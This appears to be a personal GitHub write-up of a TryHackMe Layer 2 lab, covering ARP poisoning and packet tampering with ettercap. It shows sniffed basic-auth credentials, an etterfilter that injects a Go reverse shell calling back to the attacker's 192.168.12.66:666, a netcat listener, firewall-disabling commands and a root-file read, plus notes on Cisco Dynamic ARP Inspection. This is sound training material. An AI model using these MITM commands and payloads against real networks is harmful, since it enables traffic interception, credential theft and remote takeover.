        1. `alice` 192.168.12.1:

            - ![image](https://user-images.githubusercontent.com/94720207/166413690-a5055086-6448-4ee3-b12e-36251f62d16e.png)

        2. `bob` 192.168.12.2:

            - ![image](https://user-images.githubusercontent.com/94720207/166413961-b21aeb71-6680-4cc9-945d-3a799ef2b7f0.png)

        - There's a HTTP serving something on default Port 80, **but I have a 401 "No Authorized" response from it, I saw it in the `nmap -sC` scan and also doing manually a request:**

            - ![image](https://user-images.githubusercontent.com/94720207/166414615-8152ebc1-0287-4c65-ab0f-35b69f6b0034.png)

        3. I've also tried to **sniff on my interface Eth1 to search for someone trying to send traffic to eve** _(just as the precious task)_, but this time I was unlucky: 

            - ![image](https://user-images.githubusercontent.com/94720207/166414791-90295843-4b46-4d88-bfbd-332c26143d27.png)

- **Ok, now I will try to perform an `ARP spoofing` attack as in the previous task and search for some interesting traffic:**

    - `ettercap -T -i eth1 -M arp` 

![image](https://user-images.githubusercontent.com/94720207/166525187-7adff6b4-9da9-44ba-8c72-2e268eb8c813.png)

![image](https://user-images.githubusercontent.com/94720207/166415434-e7d09a7f-912a-4bb7-88e0-64b015d7117e.png)

- BOOM! this time we were lucky, we found something!

    - It seems there are some TCP packets "flying" between `alice` 192.168.12.10 and `bob` 192.168.12.20 using HTTP Port 80.  

    - We found an encoded string:
    
        - `YWRtaW46czNjcjN0X1A0eno=`
        
            - Let's decode it, looking at it I can bet is Base64 encoding:

![image](https://user-images.githubusercontent.com/94720207/166416664-36201e11-651a-4ba8-b05a-47b9952cd64a.png)

- We also found that the request are sent to the domain `www.server.bob`

- Then, we have some credentials and a link to **a .txt file that is being requested**:  
    
    - **`HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt`**

- We also found the response to this HTTP:

![image](https://user-images.githubusercontent.com/94720207/166417905-4ef877b6-d3eb-4e40-9858-7577f0166fac.png)

- We can see some commands Request too and some files listed, including **root.txt**

![image](https://user-images.githubusercontent.com/94720207/166426127-cfb424a2-89e9-4176-8b7a-2c5ad828847b.png)

![image](https://user-images.githubusercontent.com/94720207/166426793-e5535ec5-df5a-4801-8597-fef123b14a23.png)

- That's everything we got from that attack, now let's end it with `"Q"` 

![image](https://user-images.githubusercontent.com/94720207/166418272-63dd34a3-729b-4b0f-8a75-c57a400ee0ac.png)

- Maybe with those credentials that we found, we can make again a Request to the HTTP server where we were **unauthorized**:

![image](https://user-images.githubusercontent.com/94720207/166420790-7f13ee61-0931-412c-8c5f-90d9dd093214.png)

- Good! we got an HTML response, we can see a reference to 2 different .txt files, maybe we can read them using again the credentials:

![image](https://user-images.githubusercontent.com/94720207/166421625-e4fe8cb3-0c47-4467-94c4-e4518ee9d74e.png)

- We got the **user flag** and we also found the "OK" message in the other .txt

    - But, how it worked?! 

        - Let's break the information we found at Wikipedia about "ARP Spoofing"

            - ARP spoofing, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. (For spoofed it means "disgused" as other host ot gateway) 

            - **Generally, the aim is to associate the attacker's MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.**

                1. **An attacker sends (spoofed) ARP messages to associate the attacker's MAC address with the IP address of another host...**
                    - We are the attacker located in `eve`, sending forged "spoofed" messages using `ethercap` into 192.168.12.0/24 to all hosts (`alice` & `bob`)
                    
                2. **...causing any traffic meant for that IP address to be sent to the attacker instead.**
                    -  
                
                3. _ARP spoofing may allow an attacker to intercept data frames on a network, modify the traffic, or stop all traffic._(we will see this on next task) 

        - Now, let's break the command we did on `ettercap`:

            - `ettercap -T -i eth1 -M arp` 

| Instruction       | Result                                                   |
|:-----------------:|:--------------------------------------------------------:|
| `ettercap`        | Launch ettercap                                          |          
| `-T`              | Text Only                                                |
| `-i eth1`         | Using Interface Ethernet1                                |
| `-M arp`          | **Man-in-the-Middle (MITM) Attack using ARP poisoning**  |      

- This is the information that I found on `man ettercap` https://www.mankier.com/8/ettercap

```
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

-M, --mitm <METHOD:ARGS>
MITM attack
This option will activate the man in the middle attack. The mitm attack is totally independent from the sniffing. The aim of the attack is to hijack packets and redirect them to ettercap. The sniffing engine will forward them if necessary.
You can choose the mitm attack that you prefer and also combine some of them to perform different attacks at the same time.
If a mitm method requires some parameters you can specify them after the colon. (e.g.  -M dhcp:ip_pool,netmask,etc )

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

ARP:

arp ([remote],[oneway])
This method implements the ARP poisoning mitm attack. ARP requests/replies are sent to the victims to poison their ARP cache. Once the cache has been poisoned the victims will send all packets to the attacker which, in turn, can modify and forward them to the real destination.

In silent mode (-z option) only the first target is selected, if you want to poison multiple target in silent mode use the -j option to load a list from a file.

You can select empty targets and they will be expanded as 'ANY' (all the hosts in the LAN). The target list is joined with the hosts list (created by the arp scan) and the result is used to determine the victims of the attack.

The parameter "remote" is optional and you have to specify it if you want to sniff remote ip address poisoning a gateway. Indeed if you specify a victim and the gw in the TARGETS, ettercap will sniff only connection between them, but to enable ettercap to sniff connections that pass thru the gw, you have to use this parameter.

The parameter "oneway" will force ettercap to poison only from TARGET1 to TARGET2. Useful if you want to poison only the client and not the router (where an arp watcher can be in place).

Example:

the targets are: /10.0.0.1-5/ /10.0.0.15-20/
and the host list is: 10.0.0.1 10.0.0.3 10.0.0.16 10.0.0.18

the associations between the victims will be:
1 and 16, 1 and 18, 3 and 16, 3 and 18

if the targets overlap each other, the association with identical ip address will be skipped.

NOTE: if you manage to poison a client, you have to set correct routing table in the kernel specifying the GW. If your routing table is incorrect, the poisoned clients will not be able to navigate the Internet.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

USER INTERFACES OPTIONS

-T, --text

The text only interface, only printf ;)
It is quite interactive, press 'h' in every moment to get help on what you can do.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Examples:

ettercap -T -M arp // //

Perform the ARP poisoning attack against all the hosts in the LAN. BE CAREFUL !!

ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/

Perform the ARP poisoning against the gateway and the host in the lan between 2 and 10. The 'remote' option is needed to be able to sniff the remote traffic the hosts make through the gateway.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

```

- So! The manual says:

    - **"This method _(ARP)_ implements the ARP poisoning mitm attack. ARP requests/replies are sent to the victims to poison their ARP cache. Once the cache has been poisoned the victims will send all packets to the attacker which, in turn, can modify and forward them to the real destination."**   

- Let's break that sentence more! we are close! 

1. We are using `ettercap` to send out **"forged"** and **"tricky"**  `ARP responses` to the Network 192.168.12.0/24 (Broadcast Domain). 

2. The forged responses advertise that the "correct" **MAC address for both IP addresses**, belonging to **`bob`** and **`alice`** PCs, is actually the **attacker’s MAC address!!!** (**`eve`**). 

3. This fools both **`bob`** & **`alice`** to connect to the attacker’s machine **`eve`**, instead of to each other.

4. The two devices update their **`ARP cache entries`** and from that point onwards, **communicate with the attacker instead of directly with each other.**

5. **The attacker `eve` is now secretly in the middle of all communications.**

- Finally, let's see how an ARP CACHE table with the command `arp -a` looks like when we perform a: **`MITM attack using ARP Poisoning to Spoof MAC Addresses`**, this is how an ARP Poisoning looks from inside an attacked machine when we analize the `cache of the MAC Table` _(this is just an example to realize in the easiest way how it looks, in real life you will se real MACs)_:

- I will show 3 different ARP Tables:

    1. From Broadcast Domain point of view = All MACs used within the `Broadcast Domain` _(All Hosts, interfaces, etc)_
    2. From alice ARP Table Cache = Inside `alice` PC using command `arp -a` 
    3. From bob ARP Table Cache = Inside `bob` PC using command `arp -a` 

1. **Broadcast Domain (All MACs) during an ARP Poisoning Attack:**

```

=-=-=-=-=-=-=-=- 192.168.12.0/24 Network ALL MACs  =-=-=-=-=-=-=-=-=-=-

Internet Address    Physical Address

192.168.12.2        BO-BO-BO-BO-BO-BO       <---- ( The "real" Bob with his IP & MAC )
192.168.12.1        AL-AL-AL-AL-AL-AL       <---- ( The "real" Alice with her IP & MAC )
192.168.12.66       EV-66-EV-66-EV-66       <---- ( The "real" Eve with her IP & MAC )  <Attacker "eve">
192.168.12.66       BO-BO-BO-BO-BO-BO       <---- ( FAKE Bob! look at that IP :O )      <Attacker "eve">
192.168.12.66       AL-AL-AL-AL-AL-AL       <---- ( FAKE Alice! look at that IP :O )    <Attacker "eve">


```

2. **`alice` point of view, using `arp -a` during an ARP Poisoning Attack:**

```

alice@Fz3r0# arp -a

Internet Address    Physical Address

192.168.12.2        BO-BO-BO-BO-BO-BO       <---- ( The "real" Bob with his IP & MAC )
192.168.12.66       EV-66-EV-66-EV-66       <---- ( The "real" Eve with her IP & MAC )
192.168.12.66       BO-BO-BO-BO-BO-BO       <---- ( FAKE Bob! look at that IP :O )      <Attacker "eve">

```

2. **`bob` point of view, using `arp -a` during an ARP Poisoning Attack:**

```

bob@Fz3r0# arp -a

Internet Address    Physical Address

192.168.12.1        AL-AL-AL-AL-AL-AL       <---- ( The "real" Alice with his IP & MAC )
192.168.12.66       EV-66-EV-66-EV-66       <---- ( The "real" Eve with her IP & MAC )
192.168.12.66       AL-AL-AL-AL-AL-AL       <---- ( FAKE Alice! look at that IP :O )      <Attacker "eve">

```
        
- "Normal" Subnet/LAN behavior:

![image](https://user-images.githubusercontent.com/94720207/166569305-5f4ad3fb-8129-443b-9a2a-03cfee4d9c49.png)

- ARP Poisoning Attack, Spoofing the MAC Address of all hosts within the Subnet:

![image](https://user-images.githubusercontent.com/94720207/166614633-3c89828e-9b1e-46fb-a9b3-3eff9ed5d5a0.png)
   
### Mitigation

- In this scenario I showed how the MAC Tables of Hosts `alice` and `bob` were poisoned, but you can attack hosts, switches, and routers connected to your Layer 2 network by "poisoning" their ARP caches.

- As we saw in other task, switches also have CAM Tables containing MAC/IPs of the "trusted traffic".

- In this case the author said that _"Alice and Bob are running a different OS (Ubuntu) with its default ARP implementation and no protective controls on their machines."_ so, maybe with their own protection would be enough, maybe not! That's why we need to protect switches, hosts, routers, gateways, etc.  

- I will use in this example the Cisco method to prevent ARP Poisoning, but it's very similar or the same approach for different vendors or systems. 

- Cisco uses `Dynamic ARP inspection` which is a security feature that validates ARP packets in a network. It intercepts, logs,and discards ARP packets with invalid IP-to-MAC address bindings. This capability protects the network from certain man-in-the-middle attacks.

- Dynamic ARP inspection ensures that only valid ARP requests and responses are relayed. The switch performs these activities:

    - Intercepts all ARP requests and responses on untrusted ports
    - Verifies that each of these intercepted packets has a valid IP-to-MAC address binding before updating the local ARP cache or before forwarding the packet to the appropriate destination
    - Drops invalid ARP packets
    - Dynamic ARP inspection determines the validity of an ARP packet based on valid IP-to-MAC address bindings stored in a trusted database, the DHCP snooping binding database. 
    - This database is built by DHCP snooping if DHCP snooping is enabled on the VLANs and on the switch. If the ARP packet is received on a trusted interface, the switch forwards the packet without any checks. On untrusted interfaces, the switch forwards the packet only if it is valid
    
- As you can see, is not so difficult to get rid of this kind of attacks but is mandatory to make some configurations manually, like configure our own trusted MACs databases.

- The combination of all security best practices will be the best solution, Cisco switches also includo features like Port Security or we can use external hardware/software like Firewalls or network analyzers. 

---

### Man-in-the-Middle: Manipulation

- As a pentester, your first approach would be to **try to hack `Bob's` web server**. 

- For the purpose of this room, let's assume it's impossible. Also, capturing basic auth credentials won't help for password reuse or similar attacks.

- So, let's advance our ongoing **ARP poisoning attack** into a > `fully-fledged MITM` that includes > `packet manipulation`! As Alice's packets pass through your attacker machine (`eve`), we can tamper_(modify the script, code, data)_ with them.

- How can we go about doing this? Ettercap comes with an `-F` option that allows you to **apply filters in the form of specified etterfilter.ef** files for the session. 
    
    - These .ef files, however, have to be compiled from etterfilter source filter files (.ecf) first. 
    
    - Their source code syntax is **similar to `C code`**.  
    
    - **We will assume it won't matter if Alice detects our manipulation activities. For the sake of this room, we are only going to manipulate her commands and won't be taking any OPSEC precautions.**

- Which brave command of hers should volunteer for our audacious endeavor? How about… yes, `whoami`, of course!

    - Before you copy and paste the filter below, it's best to understand the etterfilter command and its source file syntax: 
    
        - http://linux.die.net/man/8/etterfilter
 
```
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Synopsis

etterfilter [OPTIONS] FILE

Description

* The etterfilter utility is used to compile **source filter files into binary filter files** that can be interpreted by the **JIT** interpreter in the ettercap(8) filter engine. 

* You have to compile your filter scripts in order to use them in ettercap. 

* All syntax/parse errors will be checked at compile time, so you will be sure to produce a correct binary filter for ettercap.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GENERAL OPTIONS

-o, --output <FILE>
you can specify the output file for a source filter file. By default the output is filter.ef.

-t, --test <FILE>
you can analyze a compiled filter file with this option. etterfilter will print in a human readable form all the instructions contained in it. It is a sort of "disassembler" for binary filter files.

-d, --debug
prints some debug messages during the compilation. Use it more than once to increase the debug level ( etterfilter -ddd ... ).

-w, --suppress-warnings
Don't exit on warnings. With this option the compiler will compile the script even if it contains warnings.

STANDARD OPTIONS

-v, --version
Print the version and exit.
-h, --help
prints the help screen with a short summary of the available options.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                        (For syntax & functions visit the man page:  (http://linux.die.net/man/8/etterfilter)

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

```

1. Create a new `etterfilter code` file named `whoami.ecf`  

    - `nano whoami.ecf`

2. Try to write a filter matching **Alice's source port** `4444` and **transport protocol** `TCP` as well as replacing `whoami` data with a **`reverse shell payload`** of your choice.

- In the end, your filter might look similar to this one, where **`<reverse_shell>`** contains the reverse shell payload you chose:

```

if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "<-..+++_Reverse_Shell_+++..->" );
    msg("###### ETTERFILTER: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL PAYLOAD >'reverse rhell'<). ######\n");
}

```

- Note: Quotation marks need to be [escaped](https://linux.die.net/abs-guide/escapingsection.html). 

- So, in case you want your filter to replace e.g. `whoami` with `echo -e "whoami\nroot"`, then the quotation marks around `whoami\nroot` would have to be escaped like this: 

    - `replace("whoami", "echo -e \"whoami\nroot\" " )`

        - **The following is an example `reverse shell` in `Golang` with quotation marks already escaped:**

```golang

echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &

```
- **This is how the full command will look like:**

```

if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
    msg("###### ETTERFILTER-TEXT: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL PAYLOAD >'reverse rhell'<). ######\n");
}


```

- **Step 1 & Step 2:**

![image](https://user-images.githubusercontent.com/94720207/166802864-dbcd4141-15b2-41f9-96ac-be03ed71f6da.png)

3. Finally, we need to compile the `.ecf` into an `.ef` file:

    - `etterfilter whoami.ecf -o whoami.ef `

![image](https://user-images.githubusercontent.com/94720207/166803486-4bbff01d-645f-4672-8b6c-4d0680891f7a.png)

- Start your listener _(backgrounded)_. For the upper example above, you could use:

    - `nc -nvlp 666 &`

![image](https://user-images.githubusercontent.com/94720207/166803985-68176d8f-da00-47e2-bb04-76c8ac1d15af.png)

- **Before launching the Attack**, we still need to allow the incoming connection through the **`firewall`**. 

    - **Disable `ufw`** or create a corresponding allow rule; otherwise, Bob's reverse shell will be blocked by the firewall:
    
        - `ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 666 proto tcp`
    
    - ![image](https://user-images.githubusercontent.com/94720207/166804689-87bce1e5-09f7-4d62-b61d-65ad8a3057ba.png)
     
    - **Or completely disable the firewall by running:** 
    
        - `ufw disable`
        
        - `ufw status verbose` 
        
        - ![image](https://user-images.githubusercontent.com/94720207/166804853-62231d5f-4939-49fe-8638-7841df783308.png)
 
    - Now, run ettercap specifying your newly created etterfilter file:
    
        - `ettercap -T -i eth1 -M arp -F whoami.ef`
    
    - A few seconds after executing this command, you should see the **"###### ETTERFILTER: …" message and/or "Connection received on 192.168.12.20 …"**  in your Netcat output, which means you've just caught a reverse shell from Bob! 
    
    - Now, you can quit ettercap (with q), foreground your Netcat listener (with fg), and enjoy your shell!
        
        - ![image](https://user-images.githubusercontent.com/94720207/166806514-c1cee88c-614f-49a0-995a-7ab34c373427.png)
        - ![image](https://user-images.githubusercontent.com/94720207/166806081-3beacb89-9c8c-4249-b3c2-8658bb1bbc56.png)
        - ![image](https://user-images.githubusercontent.com/94720207/166806295-ac22351f-1eb6-443a-a190-a736ff6bbf88.png)
        
    - **Root shell:**
        
        - ![image](https://user-images.githubusercontent.com/94720207/166812686-3fcbefb6-c37d-43b8-bebb-036af8e8f67b.png)

- _Hint: In case the reverse shell won't work, try replacing whoami with a suitable cat command to get the flag_

    - Command: `cat /root/root.txt` 
    - Payload:

```

if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "cat /root/root.txt" );
    msg("###### ETTERFILTER: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL CAT MIAU MIAU! >'cat root.txt'<). ######\n");
}

```

-  ![image](https://user-images.githubusercontent.com/94720207/166815967-156fae60-d57e-4677-beed-5b651bd851b7.png)

    - **File read with Root Permisions:**

        - ![image](https://user-images.githubusercontent.com/94720207/166817277-6cc75c81-01e7-4c18-90fd-a6c36ba3aafd.png) 
        - ![image](https://user-images.githubusercontent.com/94720207/166817123-d6de9a28-272f-4bcd-9f3e-1f721c83a7c0.png)

- And that's all! we did it! **We gained a root shell to bob server tampering the packets inserting our payload which has been executed in bob's server, then we catched it with netcat**, we also did the same with the cat command. 

### How it worked?!

- This is just one step more after the MITM Attack using ARP Posing that we reviewed on last task, we already performed the attack sniffing and poisoning the ARP Tables of hosts, se we are "in the middle" of the transmission.

- Now we just filtered and tampered the traffic to insert a payload and let it reach Bob's server, basically, the filtering engine can match any field of the network protocols and modify whatever you want, something like this:

- Normal Behaivor:

![image](https://user-images.githubusercontent.com/94720207/166826350-8b4907be-e3d1-48a7-bea6-8e5191f2fb0c.png)

- ARP Poisoning MITM attack filtering & tampering packet: 

![image](https://user-images.githubusercontent.com/94720207/166823108-3fa75d14-4644-47e4-9696-96a3ebf9a029.png)

---

### Conclusions & Proof of Concept

- 

<span align="center"> <p align="center"> ![Fz3r0-PROOFX1](/Networking/Attacking-Cisco/ARP_Flooding+PCAP+MITM.gif) </p> </span> 

<span align="center"> <p align="center"> ![Fz3r0-PROOFX3](/Networking/Attacking-Cisco/ARP_Poisoning+MAC_Spoofing+Packet_Tampering.gif) </p> </span> 
-  **And that's how I performed a: 

    -  `MITM attack` using `ARP Poisoning` for `Spoofing the MAC Addresses` of all Hosts within the "Subnet-A".
    -   Then, I intercepted Unicast traffic from Host-1 (`alice`) to Host-2 (`bob`) using the `spoofed MACs` to "disguse" as both hosts. 
    -   Finally, I `tampered a TCP packet` sent by Host-1(`alice`) to send a `compiled Payload` that contains `Reverse Shell` to Host-2, gaining `Root Privileges` in `bob` Server, pivoting from `eve` Workstation or `RHOST` (Subnet-A/Broadcast Domain 1) which was already compromised and had `persisnent access` from our `Attacker` Machine or `LHOST` (Subnet-B/Broadcast Domain 2)**

---

<span align="center"> <p align="center"> ![giphy](https://user-images.githubusercontent.com/94720207/166587250-292d9a9f-e590-4c25-a678-d457e2268e85.gif) </p> </span> 



&nbsp;

<span align="center"> <p align="center"> _Don't forget to enjoy your days..._ </p> </span> 
<span align="center"> <p align="center"> _...It's getting dark..._ </p> </span> 

&nbsp;

<span align="center"> <p align="center"> _Maybe we're all cursed. From the moment we're born..._ </p> </span> 

&nbsp;

<span align="center"> <p align="center"> _In the mist of the night you could see me come, where shadows move and Demons lie..._ </p> </span> 
<span align="center"> <p align="center"> _I am [Fz3r0 💀](https://github.com/Fz3r0/) and the Sun no longer rises..._ </p> </span> 

---



### References

- https://tryhackme.com/room/layer2
- https://en.wikipedia.org/wiki/ARP_spoofing
- https://www.mankier.com/8/ettercap#Examples
- https://www.imperva.com/learn/application-security/arp-spoofing/
- https://community.cisco.com/t5/networking-blogs/troubleshooting-l2-issues-arp-poisoning/ba-p/3103189
- https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst_pon/software/configuration_guide/sec/b-gpon-config-security/preventing_arf_spoofing_and_flood_attack.html
- https://community.cisco.com/t5/network-security/protect-my-lan-against-arp-spoofing-poisoning/td-p/3950323
- https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/dynarp.html
- https://wiki.wireshark.org/CaptureFilters
 
---

> ![hecho en mexico 5](https://user-images.githubusercontent.com/94720207/166068790-fa1f243d-2db9-4810-a6e4-eb3c4ad23700.png)
>
> _- Hecho en México - by [Fz3r0 💀](https://github.com/Fz3r0/)_  
>
> _"In the mist of the night you could see me come, where shadows move and Demons lie..."_ 


